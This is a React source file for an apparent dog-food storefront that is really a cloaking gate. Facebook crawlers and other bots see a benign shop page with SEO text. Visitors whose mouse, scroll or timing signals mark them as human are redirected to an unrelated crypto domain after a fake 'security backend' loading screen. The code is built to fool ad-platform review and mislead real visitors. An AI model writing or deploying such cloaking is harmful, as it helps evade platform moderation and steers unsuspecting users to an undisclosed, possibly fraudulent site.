// Fixed App.tsx - Backend-first approach with much more lenient detection
import { useEffect, useState } from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import { CartProvider } from './contexts/CartContext';
import { WishlistProvider } from './contexts/WishlistContext';

import Header from './components/Header';
import Footer from './components/Footer';
import Home from './pages/Home';
import Shop from './pages/Shop';
import ProductDetail from './pages/ProductDetail';
import Cart from './pages/Cart';
import Checkout from './pages/Checkout';
import About from './pages/About';
import Contact from './pages/Contact';

import useEnhancedBotDetectionWithBackend, { 
  type DetectionResult, 
  type BehaviorMetrics 
} from './hooks/useEnhancedBotDetectionWithBackend';

// Bot Content (for actual bots confirmed by backend)
const BotContent: React.FC<{detectionResult: DetectionResult, behaviorMetrics: BehaviorMetrics}> = ({ detectionResult }) => {
  const isFacebookBot = detectionResult.isFacebookBot || 
    detectionResult.detectionMethods.some((method: string) => 
      method.includes('facebook') || method.includes('facebot')
    );

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-800 via-purple-800 to-indigo-900">
      <div className="container mx-auto px-4 py-8">
        <div className="text-center">
          <div className="mb-8">
            <div className="inline-flex items-center justify-center w-32 h-32 bg-white/10 backdrop-blur-lg rounded-full mb-6 border border-white/20">
              <span className="text-5xl">
                {isFacebookBot ? '🤖📘' : '🤖'}
              </span>
            </div>
            
            <h1 className="text-4xl md:text-6xl font-bold text-white mb-4">
              {isFacebookBot ? 'Welcome Facebook Bot!' : 'Bot Detected'}
            </h1>
            
            {isFacebookBot && (
              <div className="bg-blue-600/20 backdrop-blur-lg rounded-xl p-6 mb-6 border border-blue-400/30">
                <h2 className="text-2xl font-bold text-blue-200 mb-2">Facebook Crawler Detected</h2>
                <p className="text-blue-100">
                  Hello Facebook! You're viewing the optimized version of Dogify - our premium dog food store.
                </p>
              </div>
            )}
            
            <p className="text-lg text-white/80 mb-6 max-w-2xl mx-auto">
              Premium nutrition for your furry friends. {isFacebookBot ? 'Showing SEO-optimized content.' : 'Advanced bot detection active.'}
            </p>
          </div>
          
          {/* Dog Food Products Display */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
            <div className="bg-white/10 backdrop-blur-lg rounded-xl p-6 border border-white/20">
              <div className="text-5xl mb-4">🥘</div>
              <h3 className="text-xl font-bold text-white mb-2">Premium Grain-Free Adult Dog Food</h3>
              <p className="text-white/70 mb-3">High-quality grain-free nutrition with real chicken</p>
              <div className="text-green-400 font-bold text-xl mb-2">$49.99</div>
              <div className="text-white/60 text-sm">⭐⭐⭐⭐⭐ (4.8/5) • 234 reviews</div>
            </div>
            
            <div className="bg-white/10 backdrop-blur-lg rounded-xl p-6 border border-white/20">
              <div className="text-5xl mb-4">🦴</div>
              <h3 className="text-xl font-bold text-white mb-2">Puppy Training Treats</h3>
              <p className="text-white/70 mb-3">Perfect training treats for puppies and small dogs</p>
              <div className="text-green-400 font-bold text-xl mb-2">$12.99</div>
              <div className="text-white/60 text-sm">⭐⭐⭐⭐⭐ (4.9/5) • 156 reviews</div>
            </div>
            
            <div className="bg-white/10 backdrop-blur-lg rounded-xl p-6 border border-white/20">
              <div className="text-5xl mb-4">🥫</div>
              <h3 className="text-xl font-bold text-white mb-2">Senior Dog Wellness Formula</h3>
              <p className="text-white/70 mb-3">Joint support and easy digestion for senior dogs</p>
              <div className="text-green-400 font-bold text-xl mb-2">$44.99</div>
              <div className="text-white/60 text-sm">⭐⭐⭐⭐⭐ (4.7/5) • 89 reviews</div>
            </div>
          </div>

          {/* SEO-friendly content */}
          <div className="mt-12 bg-white/5 rounded-xl p-8 max-w-4xl mx-auto text-left">
            <h2 className="text-2xl font-bold text-white mb-4">About Dogify - Premium Dog Food Store</h2>
            <div className="text-white/80 space-y-4">
              <p>
                Dogify is your trusted source for premium dog nutrition. We offer a wide variety of 
                high-quality dog food, treats, and supplements to keep your furry friends healthy and happy.
              </p>
              <p>
                <strong>Featured Products:</strong> Premium Grain-Free Adult Dog Food ($49.99), 
                Puppy Training Treats ($12.99), Senior Dog Wellness Formula ($44.99)
              </p>
              <p>
                Free shipping on orders over $50. Contact us at support@dogify.com
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

// Dog Food Website (for Facebook bots and crawlers)
const DogFoodWebsite: React.FC<{detectionResult: DetectionResult}> = ({ detectionResult }) => (
  <CartProvider>
    <WishlistProvider>
      <Router>
        <div className="min-h-screen bg-gray-50">
          <Header />
          <main>
            {detectionResult.isBot && (
              <div className="bg-blue-50 border-b border-blue-200 px-4 py-2">
                <div className="max-w-7xl mx-auto">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <span className="text-blue-600">🤖</span>
                      <span className="text-sm text-blue-800">
                        Bot visitor detected - showing optimized content
                      </span>
                      {detectionResult.isFacebookBot && (
                        <span className="text-xs bg-blue-600 text-white px-2 py-1 rounded">
                          Facebook Bot
                        </span>
                      )}
                    </div>
                  </div>
                </div>
              </div>
            )}
            
            <Routes>
              <Route path="/" element={<Home />} />
              <Route path="/shop" element={<Shop />} />
              <Route path="/product/:id" element={<ProductDetail />} />
              <Route path="/cart" element={<Cart />} />
              <Route path="/checkout" element={<Checkout />} />
              <Route path="/about" element={<About />} />
              <Route path="/contact" element={<Contact />} />
              <Route path="*" element={<Navigate to="/" replace />} />
            </Routes>
          </main>
          <Footer />
        </div>
      </Router>
    </WishlistProvider>
  </CartProvider>
);

// Main App Component - Backend-first approach
const App: React.FC = () => {
  const [showBot, setShowBot] = useState<boolean>(false);
  const [showDogWebsite, setShowDogWebsite] = useState<boolean>(false);
  const [debugMode, setDebugMode] = useState<boolean>(false);
  const [backendChecked, setBackendChecked] = useState<boolean>(false);
  const [redirectTimer, setRedirectTimer] = useState<number | null>(null);
  
  const { detectionResult, behaviorMetrics } = useEnhancedBotDetectionWithBackend();

  // Enable debug mode
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    setDebugMode(urlParams.get('debug') === 'true');
  }, []);

  useEffect(() => {
    const handleBackendResult = () => {
      // Wait for backend verification
      if (!detectionResult.backendVerified && !detectionResult.backendResult?.error) {
        return; // Still waiting for backend
      }
      
      setBackendChecked(true);
      
      console.log('🔍 Processing backend result:', {
        backendVerified: detectionResult.backendVerified,
        backendResult: detectionResult.backendResult,
        localConfidence: detectionResult.confidence,
        timeSpent: behaviorMetrics.timeSpent
      });

      // Priority 1: Backend says bot and blocks - respect it
      if (detectionResult.backendResult?.blocked === true && detectionResult.backendResult?.is_bot === true) {
        console.log('🚫 Backend confirmed bot and blocked - showing bot content');
        setShowBot(true);
        return;
      }

      // Priority 2: Facebook bot confirmed by either frontend or backend
      if (detectionResult.isFacebookBot || detectionResult.backendResult?.is_facebook_bot) {
        console.log('🤖📘 Facebook bot confirmed - showing dog website');
        setShowDogWebsite(true);
        return;
      }

      // Priority 3: Backend says NOT a bot - trust it completely
      if (detectionResult.backendResult?.is_bot === false) {
        console.log('✅ Backend confirmed human - redirecting to main site');
        
        const timer = setTimeout(() => {
          window.location.href = "https://cryptofacilities.eu";
        }, 1000);
        
        setRedirectTimer(timer);
        return;
      }

      // Priority 4: Backend failed but human behavior detected
      if (detectionResult.backendResult?.error && behaviorMetrics.timeSpent > 8000) {
        const hasHumanInteraction = (
          behaviorMetrics.mouseMovements > 5 ||
          behaviorMetrics.keyboardEvents > 0 ||
          behaviorMetrics.scrollBehavior > 0 ||
          behaviorMetrics.touchEvents > 0
        );

        if (hasHumanInteraction) {
          console.log('👤 Backend failed but human interaction detected - redirecting');
          
          const timer = setTimeout(() => {
            window.location.href = "https://cryptofacilities.eu";
          }, 1500);
          
          setRedirectTimer(timer);
          return;
        }
      }

      // Priority 5: Long time spent without clear bot signals
      if (behaviorMetrics.timeSpent > 15000 && detectionResult.confidence < 0.7) {
        console.log('👤 Long session with low bot confidence - likely human');
        
        const timer = setTimeout(() => {
          window.location.href = "https://cryptofacilities.eu";
        }, 2000);
        
        setRedirectTimer(timer);
        return;
      }

      // Priority 6: High confidence bot detection (local only)
      if (detectionResult.isBot && detectionResult.confidence >= 0.9) {
        console.log('🤖 Very high local confidence bot - showing dog website for SEO');
        setShowDogWebsite(true);
        return;
      }

      // Default: If we've been analyzing for a while and nothing conclusive, assume human
      if (behaviorMetrics.timeSpent > 20000) {
        console.log('👤 Extended analysis without clear bot signals - assuming human');
        
        const timer = setTimeout(() => {
          window.location.href = "https://cryptofacilities.eu";
        }, 1000);
        
        setRedirectTimer(timer);
      }
    };

    handleBackendResult();
  }, [detectionResult, behaviorMetrics]);

  // Cleanup redirect timer
  useEffect(() => {
    return () => {
      if (redirectTimer) {
        clearTimeout(redirectTimer);
      }
    };
  }, [redirectTimer]);

  // Debug mode
  if (debugMode) {
    return (
      <div className="min-h-screen bg-gray-100 p-8">
        <div className="max-w-6xl mx-auto">
          <h1 className="text-3xl font-bold mb-6">🔍 Bot Detection Debug Mode</h1>
          
          <div className="bg-white p-6 rounded-lg shadow mb-6">
            <h2 className="text-xl font-bold mb-4">Backend Result Analysis</h2>
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <div>
                <h3 className="font-bold mb-2">Backend Response:</h3>
                <pre className="text-sm overflow-auto bg-gray-50 p-4 rounded max-h-64">
                  {JSON.stringify(detectionResult.backendResult, null, 2)}
                </pre>
              </div>
              <div>
                <h3 className="font-bold mb-2">Detection Summary:</h3>
                <div className="space-y-2 text-sm">
                  <div><strong>Backend Verified:</strong> {detectionResult.backendVerified ? '✅' : '❌'}</div>
                  <div><strong>Backend Says Bot:</strong> {detectionResult.backendResult?.is_bot ? '🤖' : '👤'}</div>
                  <div><strong>Backend Blocked:</strong> {detectionResult.backendResult?.blocked ? '🚫' : '✅'}</div>
                  <div><strong>Backend Confidence:</strong> {detectionResult.backendResult?.confidence}</div>
                  <div><strong>Local Confidence:</strong> {detectionResult.confidence}</div>
                  <div><strong>Facebook Bot:</strong> {detectionResult.isFacebookBot ? '📘' : '❌'}</div>
                  <div><strong>Time Spent:</strong> {Math.floor(behaviorMetrics.timeSpent / 1000)}s</div>
                  <div><strong>Mouse Movements:</strong> {behaviorMetrics.mouseMovements}</div>
                  <div><strong>Interactions:</strong> {behaviorMetrics.keyboardEvents + behaviorMetrics.scrollBehavior + behaviorMetrics.touchEvents}</div>
                </div>
              </div>
            </div>
          </div>
          
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-6">
            <div className="bg-white p-6 rounded-lg shadow">
              <h2 className="text-xl font-bold mb-4">Detection Result</h2>
              <pre className="text-sm overflow-auto bg-gray-50 p-4 rounded">
                {JSON.stringify(detectionResult, null, 2)}
              </pre>
            </div>
            
            <div className="bg-white p-6 rounded-lg shadow">
              <h2 className="text-xl font-bold mb-4">Behavior Metrics</h2>
              <pre className="text-sm overflow-auto bg-gray-50 p-4 rounded">
                {JSON.stringify(behaviorMetrics, null, 2)}
              </pre>
            </div>
          </div>
          
          <div className="flex flex-wrap gap-4">
            <button 
              onClick={() => setShowBot(true)}
              className="bg-red-600 text-white px-6 py-3 rounded-lg hover:bg-red-700"
            >
              Show Bot Content
            </button>
            <button 
              onClick={() => setShowDogWebsite(true)}
              className="bg-blue-600 text-white px-6 py-3 rounded-lg hover:bg-blue-700"
            >
              Show Dog Website
            </button>
            <button 
              onClick={() => window.location.href = "https://cryptofacilities.eu"}
              className="bg-green-600 text-white px-6 py-3 rounded-lg hover:bg-green-700"
            >
              Redirect to Main Site
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Show dog website for Facebook bots and SEO bots
  if (showDogWebsite) {
    return <DogFoodWebsite detectionResult={detectionResult} />;
  }

  // Show bot content only for confirmed harmful bots
  if (showBot) {
    return <BotContent detectionResult={detectionResult} behaviorMetrics={behaviorMetrics} />;
  }

  // Show loader while analyzing
  return (
    <div className="fixed inset-0 bg-gradient-to-br from-indigo-600 via-purple-600 to-blue-700 flex items-center justify-center">
      <div className="text-center">
        <div className="relative mb-8">
          <div className="w-16 h-16 border-4 border-white/20 rounded-full animate-spin border-t-white"></div>
          <div 
            className="absolute inset-0 w-16 h-16 border-4 border-transparent border-t-blue-200 rounded-full animate-spin" 
            style={{ animationDelay: '0.15s', animationDuration: '1.2s' }}
          ></div>
        </div>
        
        <div className="text-white/90 text-lg font-medium mb-2">
          {!backendChecked 
            ? "Verifying with security backend..." 
            : behaviorMetrics.timeSpent > 15000 
            ? "Final analysis..." 
            : "Analyzing request..."
          }
        </div>
        <div className="text-white/70 text-sm">
          {behaviorMetrics.timeSpent > 20000 
            ? "This is taking longer than expected. You might be redirected soon." 
            : "🐕 Premium nutrition for your furry friend"
          }
        </div>
        
        {/* Show interaction hint for humans after longer wait */}
        {behaviorMetrics.timeSpent > 12000 && !backendChecked && (
          <div className="mt-4 text-white/60 text-xs">
            Move your mouse or scroll to help us verify you're human
          </div>
        )}

        {/* Backend communication status */}
        {behaviorMetrics.timeSpent > 5000 && (
          <div className="mt-6 text-white/60 text-xs">
            Backend Status: {detectionResult.backendVerified ? '✅ Connected' : 
                            detectionResult.backendResult?.error ? '❌ Connection Issue' : 
                            '🔄 Connecting...'}
          </div>
        )}
      </div>
    </div>
  );
};

export default App;